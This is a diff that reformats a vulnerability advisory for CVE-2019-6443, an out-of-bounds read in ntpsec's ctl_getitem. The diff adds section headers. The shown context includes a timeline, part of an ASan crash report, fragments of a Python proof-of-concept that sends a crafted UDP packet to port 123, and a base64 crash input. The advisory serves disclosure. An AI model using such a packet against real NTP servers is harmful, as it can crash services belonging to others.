@@ -26,14 +26,19 @@ An out-of-bounds read bug was found in ntpsec.
 
 Affected versions: ntpsec 1.1.1, 1.1.2
 
-Timeline:
+
+# Timeline
 
 2018-10-15 Bug discovered
 2018-10-16 Bug reported
 2019-01-13 Vendor released patch version 1.1.3
 2019-01-16 MITRE allocated CVE-2019-6443
 
+
+# Details
+
 The bug exists in ctl_getitem. Code snippet:
+
 
   2539   /* Scan the string in the packet until we hit comma or
   2540    * EoB. Register position of first '=' on the fly. */
@@ -44,7 +49,9 @@ The bug exists in ctl_getitem. Code snippet:
   2545       break;
   2546   }
 
-Crash report:
+
+# Crash report
+
 
   # uname -a
   Linux h4xb0x 3.16.0-7-amd64 #1 SMP Debian 3.16.59-1 (2018-10-03) x86_64 GNU/Linux
@@ -154,7 +161,9 @@ Crash report:
     ASan internal:           fe
   ==18249==ABORTING
 
-The following PoC exploit can be used to demonstrate the issue:
+
+# Proof of concept exploit
+
 
   #!/usr/bin/env python
   import sys
@@ -252,7 +261,9 @@ The following PoC exploit can be used to demonstrate the issue:
   sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   sock.sendto(buf, ('127.0.0.1', 123))
 
-Proof of discovery:
+
+# Proof of discovery
+
 
   $ base64 bug1
   TgID7AAAAAAAAALHdGM9EACvLCwsLPoAAPoLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsG
@@ -285,6 +296,7 @@ Proof of discovery:
   a3e54a033eea3c3f0a5c795aaa0d8c8b3f4cbb013760e3b1865afb20eb4347b0  bug1
 
 https://twitter.com/magnusstubman/status/1051893954705264641
+
 
 # References
 
